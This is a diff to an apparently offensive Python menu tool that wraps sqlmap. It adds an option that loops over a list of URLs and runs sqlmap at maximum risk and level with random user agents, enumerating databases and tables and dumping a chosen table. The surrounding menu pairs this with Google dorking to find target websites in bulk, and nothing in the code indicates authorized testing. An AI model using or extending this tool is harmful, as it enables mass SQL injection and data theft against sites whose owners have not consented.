@@ -31,6 +31,7 @@ print(Fore.LIGHTYELLOW_EX +"""
 
 // SQLMAP
 
+[M] scan multiple websites with sqlmap
 [D] google hacking / dorks
 [SS] sqli attack with sqlmap 
 [DS] auto scan with dork & sqlmap
@@ -85,6 +86,16 @@ if at == "SS" :
    table = input("table => ")
    os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " -T" + table + " --dump")
 
+if option == "M" :
+    multi = open("urls.txt", "r")
+    for url in multi:
+        print(url+" starting...")
+        os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 --dbs")
+        db = input("db name => ")
+        os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " --tables")
+        table = input("table => ")
+        os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " -T" + table + " --dump")
+           
 if at == "D" :
    searchterm = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
    searchnumber = input(f'{Fore.GREEN}how many websites do u want? => {Fore.WHITE}')
